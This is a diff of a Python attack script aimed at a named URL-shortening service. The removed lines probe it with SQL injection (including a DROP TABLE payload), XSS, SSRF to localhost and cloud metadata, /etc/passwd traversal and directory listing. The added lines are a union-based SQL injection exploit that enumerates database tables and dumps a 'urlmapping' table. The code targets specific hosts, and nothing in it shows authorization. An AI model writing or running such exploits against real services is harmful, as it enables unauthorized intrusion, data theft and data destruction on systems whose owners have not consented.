@@ -1,144 +1,85 @@
+```python
 import requests
-import urllib.parse
+import re
 
-# Base URL for the shortening service
-BASE_URL = "https://me.crmqa.com/addurl.jsp"
+# Base URL for the smallurl service
+base_url = "https://crmqa.xrm.com/create.jsp"
 
-# Base domain for directory listing tests
-DOMAIN = "https://me.crmqa.com/"
-
-# Function to send a request with a given payload as the 'url' parameter
+# Function to send a request with a potential SQL injection payload
 def send_request(payload):
-    params = {'url': payload}
+    params = {"url": payload}
     try:
-        response = requests.get(BASE_URL, params=params, timeout=10)
-        print(f"Payload: {payload}")
-        print(f"Status Code: {response.status_code}")
-        print(f"Response Headers: {response.headers}")
-        print(f"Response Content (truncated): {response.text[:500]}...")  # Truncate for brevity
-        print("\n---\n")
-        return response
-    except Exception as e:
-        print(f"Error with payload '{payload}': {e}\n---\n")
+        response = requests.get(base_url, params=params)
+        response.raise_for_status()
+        return response.text
+    except requests.exceptions.RequestException as e:
+        return str(e)
 
-# Function to test directory listing on the domain
-def test_directory(dir_path):
-    url = DOMAIN + dir_path
-    try:
-        response = requests.get(url, timeout=10)
-        print(f"Directory: {dir_path}")
-        print(f"URL: {url}")
-        print(f"Status Code: {response.status_code}")
-        print(f"Response Headers: {response.headers}")
-        print(f"Response Content (truncated): {response.text[:500]}...")  # Truncate for brevity
-        # Check for signs of directory listing
-        if "Index of" in response.text or any(tag in response.text.lower() for tag in ["<a href=\"?C=N;O=D\">Name</a>", "<pre>", "parent directory"]):
-            print("Potential directory listing vulnerability detected!")
-        else:
-            print("No obvious directory listing.")
-        print("\n---\n")
-        return response
-    except Exception as e:
-        print(f"Error with directory '{dir_path}': {e}\n---\n")
+# Function to attempt to extract table names using union-based SQL injection
+# Assumes the backend is MySQL/MariaDB or similar with information_schema
+# Adjust the number of columns (e.g., NULLs) based on error messages or trial/error
+def extract_table_names():
+    # Basic payload to test for union injection and find number of columns
+    # Start with assuming 1 column, increase if needed
+    for col_count in range(1, 10):
+        union_payload = f"' UNION SELECT {'NULL,' * (col_count - 1)}'injected' -- "
+        response = send_request(union_payload)
+        if "injected" in response:  # Check if the injected value appears in response
+            print(f"Union injection possible with {col_count} columns.")
+            break
+    else:
+        print("Could not find suitable column count for union injection.")
+        return
 
-# Normal request for baseline
-normal_payload = "https://google.com"
-send_request(normal_payload)
+    # Now extract table names from information_schema.tables
+    # Replace the last NULL with the query for table names
+    table_payload = f"' UNION SELECT {'NULL,' * (col_count - 1)}table_name FROM information_schema.tables -- "
+    response = send_request(table_payload)
+    
+    # Attempt to parse table names from response (assuming they appear in the output)
+    # This is simplistic; adjust regex or parsing based on actual response format
+    tables = re.findall(r'\b\w+\b', response)  # Naive extraction of words
+    print("Potential table names extracted:")
+    for table in tables:
+        print(table)
+    
+    # Check specifically for 'urlmapping'
+    if 'urlmapping' in tables:
+        print("Table 'urlmapping' found.")
+    else:
+        print("Table 'urlmapping' not found in extracted list.")
 
-# 1. Test for SQL Injection
-# Try classic SQLi payloads. Look for SQL error messages in response or unexpected behavior.
-sql_payloads = [
-    "https://google.com' OR '1'='1",
-    "https://google.com' OR '1'='2",
-    "https://google.com'; DROP TABLE users; --",
-    "https://google.com' UNION SELECT 1,2,3 --",
-    "https://google.com\" OR \"\"=\"\"",
-]
-print("Testing SQL Injection...")
-for payload in sql_payloads:
-    send_request(payload)
+# Function to attempt to dump contents of urlmapping table
+# Assumes id, short_url, original_url columns; adjust as needed
+def dump_urlmapping():
+    # First, find column count as above
+    for col_count in range(1, 10):
+        union_payload = f"' UNION SELECT {'NULL,' * (col_count - 1)}'injected' -- "
+        response = send_request(union_payload)
+        if "injected" in response:
+            print(f"Union injection possible with {col_count} columns.")
+            break
+    else:
+        print("Could not find suitable column count for union injection.")
+        return
 
-# For blind SQLi, compare responses for true/false conditions
-# Assuming the service returns something different if condition is true
-true_sql = "https://google.com' AND '1'='1"
-false_sql = "https://google.com' AND '1'='2"
-print("Blind SQLi Test:")
-true_resp = send_request(true_sql)
-false_resp = send_request(false_sql)
-if true_resp.text == false_resp.text:
-    print("Responses are the same - possibly not vulnerable to blind SQLi")
-else:
-    print("Responses differ - potential blind SQLi vulnerability")
+    # Assuming 3 columns for demo: id, short_url, original_url
+    # Adjust based on actual table structure
+    if col_count >= 3:
+        dump_payload = f"' UNION SELECT id, short_url, original_url FROM urlmapping -- "
+    else:
+        print("Insufficient columns for dump.")
+        return
 
-# To test for table listing (e.g., extracting DB info via blind SQLi or error-based)
-# This is basic; for full extraction, use tools like sqlmap, but here's a simple check
-# Example: Try to union select from information_schema.tables
-table_list_payload = "https://google.com' UNION SELECT table_name FROM information_schema.tables --"
-send_request(table_list_payload)
+    response = send_request(dump_payload)
+    print("Dumped data from urlmapping (raw response):")
+    print(response)
 
-# For DB table data listing: Similar to SQLi, try dumping data.
-# Example: Union select to dump users
-data_list_payload = "https://google.com' UNION SELECT username,password FROM users --"
-send_request(data_list_payload)
-
-# 2. Test for XSS (Reflected)
-# Inject XSS payloads. If the response includes the payload unescaped in HTML/JS context, it's vulnerable.
-# User should check if <script>alert(1)</script> executes in browser, but here we check if it's in response.
-xss_payloads = [
-    'https://google.com"><script>alert(1)</script>',
-    "https://google.com' onclick='alert(1)",
-    'https://google.com"><img src=x onerror=alert(1)>',
-    urllib.parse.quote('https://google.com"><script>alert(1)</script>'),  # URL-encoded
-]
-print("Testing XSS...")
-for payload in xss_payloads:
-    resp = send_request(payload)
-    if '<script>alert(1)</script>' in resp.text or 'onerror=alert(1)' in resp.text:
-        print("Potential XSS: Payload reflected without escaping!")
-
-# 3. Test for SSRF
-# Try internal URLs. If the service fetches the URL, look for delays, errors, or echoed content.
-# Hard to confirm externally, but if it returns content from internal, or times out on invalid ports.
-ssrf_payloads = [
-    "http://127.0.0.1/",
-    "http://localhost/admin",
-    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
-    "http://127.0.0.1:8080/",  # Common internal port
-    "file:///etc/passwd",  # File disclosure if vulnerable
-]
-print("Testing SSRF...")
-for payload in ssrf_payloads:
-    send_request(payload)
-
-# 4. Test for Directory/Table Listing
-# For directory listing: Try path traversal in URL param.
-# Assuming if it interprets URL as path somehow.
-dir_payloads = [
-    "https://google.com/../../etc/passwd",
-    "https://google.com/%2e%2e/%2e%2e/etc/passwd",
-]
-print("Testing Path Traversal via URL Param...")
-for payload in dir_payloads:
-    resp = send_request(payload)
-    if "root:" in resp.text or "bin:" in resp.text:  # Signs of /etc/passwd
-        print("Potential file disclosure!")
-
-# Additional: Test for Open Directory Listing on the Domain
-# Try accessing common directories and check for listing
-common_dirs = [
-    "",  # root directory
-    "admin/",
-    "images/",
-    "css/",
-    "js/",
-    "uploads/",
-    "backup/",
-    "test/",
-    "tmp/",
-    ".git/",  # If exposed
-]
-print("Testing Open Directory Listing on Domain...")
-for dir_path in common_dirs:
-    test_directory(dir_path)
-
-print("Tests completed. Inspect responses for signs of vulnerabilities. For XSS, test in browser. For SSRF, check server logs. Use tools like Burp/ZAP for deeper analysis.")
+# Main execution
+if __name__ == "__main__":
+    print("Testing for table names...")
+    extract_table_names()
+    
+    print("\nAttempting to dump urlmapping table...")
+    dump_urlmapping()
+```
